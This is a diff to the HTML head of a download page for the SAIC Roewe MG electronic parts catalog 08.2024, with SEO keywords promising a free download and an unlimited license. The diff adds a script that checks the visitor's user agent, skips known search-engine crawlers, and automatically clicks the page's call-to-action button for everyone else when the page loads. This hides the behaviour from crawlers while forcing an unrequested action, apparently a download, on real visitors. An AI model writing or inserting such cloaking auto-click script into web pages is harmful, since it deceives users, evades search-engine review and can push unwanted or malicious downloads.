@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>SAIC Roewe MG EPC 08.2024</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download the SAIC Roewe MG EPC 08.2024 Electronic Parts Catalog for detailed parts info for SAIC Roewe and MG vehicles. Available in English and Chinese.">
     <meta name="keywords" content="saic roewe mg epc 08.2024, saic roewe epc august 2024, roewe mg epc 2024 download, saic epc catalogue free download, saic roewe mg epc 2024 free download, roewe mg epc 2024 pdf, roewe epc 2024 pdf free download, mg epc 2024 download, roewe mg epc catalog, saic roewe epc for windows 10, saic roewe epc unlimited license, mg electronic parts catalog 2024, roewe epc parts catalog download, саик ровіз мг епц 2024, саик ровіз епц каталог, саик ровіз мг епц скачать бесплатно, роувэй мг эка каталог 2024, роувэй мг епц 2024 бесплатно">
     <style>
